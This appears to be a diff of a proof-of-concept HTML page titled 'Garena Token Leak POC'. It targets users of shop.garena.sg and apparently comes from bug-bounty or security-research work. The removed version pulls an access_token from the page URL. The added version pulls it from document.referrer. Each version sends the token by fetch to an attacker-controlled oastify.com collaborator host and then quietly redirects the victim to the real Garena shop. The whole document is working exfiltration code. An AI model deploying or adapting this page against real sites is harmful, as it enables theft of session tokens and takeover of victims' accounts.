@@ -1,19 +1,26 @@
-
 <!DOCTYPE html>
-<html>
-  <body>
-    <h2>Redirecting...</h2>
-    <script>
-      const token = new URLSearchParams(window.location.search).get("access_token");
-      if (token) {
-        // Send token to attacker
-        fetch("https://6ryzc0x617f160p5d4v2my9970dr1rpg.oastify.com/leak?token=" + encodeURIComponent(token));
-      }
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Garena Token Leak POC</title>
+</head>
+<body>
+  <h2>Loading...</h2>
 
-      // Then redirect to the real Garena URL (with or without token)
-      setTimeout(() => {
-        window.location.href = "https://shop.garena.sg/?utm_source=FF+RedeemPage&utm_medium=Entrance";
-      }, 2000); // Wait 2 seconds to make sure the token is sent
-    </script>
-  </body>
+  <script>
+    // Read referrer and try to extract access_token
+    const ref = document.referrer;
+    if (ref.includes("access_token=")) {
+      const token = ref.split("access_token=")[1].split(/[&#]/)[0];
+
+      // Leak to attacker-controlled endpoint
+      fetch("https://kc0dxeikml0freajyigg7cunsey5m6av.oastify.com/leak?token=" + encodeURIComponent(token));
+    }
+
+    // Optional: Redirect victim back to a normal page after few seconds
+    setTimeout(() => {
+      window.location.href = "https://shop.garena.sg/?utm_source=FF+RedeemPage&utm_medium=Entrance";
+    }, 2000);
+  </script>
+</body>
 </html>
